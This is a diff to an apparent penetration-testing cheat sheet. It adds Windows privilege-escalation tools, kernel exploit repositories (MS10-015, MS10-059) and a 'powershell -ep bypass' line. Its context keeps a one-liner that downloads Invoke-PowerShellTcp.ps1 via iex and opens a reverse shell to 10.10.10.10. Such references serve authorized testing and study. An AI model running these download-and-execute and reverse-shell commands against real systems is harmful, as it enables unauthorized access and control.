@@ -490,11 +490,11 @@ Tools can help to find the way to privesc, but they shouldn't substitute manual 
 - Windows  
 
 Powershell :  
-[Sherlock](https://github.com/rasta-mouse/Sherlock)  
 [JAWS](https://github.com/411Hall/JAWS)  
 [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)  
-with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)  
-and [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)  
+with [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)  
+and [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)  
+[Sherlock](https://github.com/rasta-mouse/Sherlock)  
 [SessionGopher](https://github.com/Arvanaghi/SessionGopher)  
 
 Executables :  
@@ -502,9 +502,13 @@ Executables :
 [BloodHound](https://github.com/BloodHoundAD/BloodHound)  
 with [SharpHound](https://github.com/BloodHoundAD/SharpHound3)  
 [Seatbelt](https://github.com/GhostPack/Seatbelt)  
+[Watson](https://github.com/rasta-mouse/Watson)  
 
 Others :  
 [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)  
+[Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)  
+with [MS10-015](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-015)  
+and [MS10-059](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059)  
 
 ### Manual enum
 
@@ -725,6 +729,11 @@ copy \\$IP\share\$FILE .
 
 ```
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 1337
+```
+
+Bypass execution policy :  
+```
+powershell -ep bypass
 ```
 
 ### Reverse shells from code execution on Linux
